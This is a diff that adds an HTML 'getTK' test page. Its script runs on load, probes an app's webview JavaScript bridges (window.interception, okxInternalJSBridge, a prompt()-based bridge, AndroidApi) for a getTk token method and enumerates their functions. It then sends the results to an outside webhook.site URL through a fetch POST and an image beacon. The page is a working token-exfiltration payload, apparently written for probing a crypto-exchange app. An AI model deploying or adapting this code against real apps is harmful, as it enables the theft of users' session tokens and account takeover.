@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head><title>GetTK Test...</title></head>
+<body>
+<h1 id="status">Testing getTK...</h1>
+<pre id="results">Waiting...</pre>
+<script>
+var WEBHOOK = 'https://webhook.site/aa2b16e2-fb70-4219-a296-8c9c6977baf5';
+
+function log(msg) {
+    document.getElementById('results').textContent += '\n' + msg;
+}
+
+// Try to call getTK via okxInternalJSBridge
+function tryGetTK() {
+    var results = {};
+    
+    // Method 1: interception bridge (seems to be the main bridge)
+    if (typeof window.interception !== 'undefined') {
+        try {
+            var r1 = window.interception.getTk ? window.interception.getTk() : 'no getTk method';
+            results['interception.getTk'] = String(r1);
+        } catch(e) { results['interception.getTk_err'] = e.message; }
+        
+        // List all methods
+        try {
+            var methods = [];
+            for (var m in window.interception) {
+                if (typeof window.interception[m] === 'function') {
+                    methods.push(m);
+                }
+            }
+            results['interception_methods'] = methods;
+        } catch(e) { results['interception_methods_err'] = e.message; }
+    }
+    
+    // Method 2: okxInternalJSBridge
+    if (typeof window.okxInternalJSBridge !== 'undefined') {
+        try {
+            var methods2 = [];
+            for (var m2 in window.okxInternalJSBridge) {
+                if (typeof window.okxInternalJSBridge[m2] === 'function') {
+                    methods2.push(m2);
+                }
+            }
+            results['okxInternalJSBridge_methods'] = methods2;
+        } catch(e) { results['okxInternalJSBridge_err'] = e.message; }
+    }
+    
+    // Method 3: prompt() based bridge (OKX's protocol)
+    try {
+        var promptResult = prompt(JSON.stringify({
+            uri: 'request',
+            method: 'getTK',
+            data: []
+        }));
+        results['prompt_getTK'] = promptResult;
+    } catch(e) { results['prompt_err'] = e.message; }
+    
+    // Method 4: Try AndroidApi
+    if (typeof window.AndroidApi !== 'undefined') {
+        try {
+            var r4 = window.AndroidApi.getTk ? window.AndroidApi.getTk() : 'no getTk';
+            results['AndroidApi.getTk'] = String(r4);
+        } catch(e) { results['AndroidApi_err'] = e.message; }
+    }
+    
+    var json = JSON.stringify(results, null, 2);
+    document.getElementById('results').textContent = json;
+    document.title = 'TK_RESULT:' + JSON.stringify(results).length;
+    
+    // Send to webhook
+    try {
+        fetch(WEBHOOK + '?test=getTK', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            mode: 'no-cors',
+            body: JSON.stringify({test: 'getTK', results: results, ts: new Date().toISOString()})
+        });
+    } catch(e) {}
+    new Image().src = WEBHOOK + '?getTK=' + encodeURIComponent(JSON.stringify(results).substring(0,200));
+}
+
+// Run after small delay
+setTimeout(tryGetTK, 500);
+</script>
+</body>
+</html>
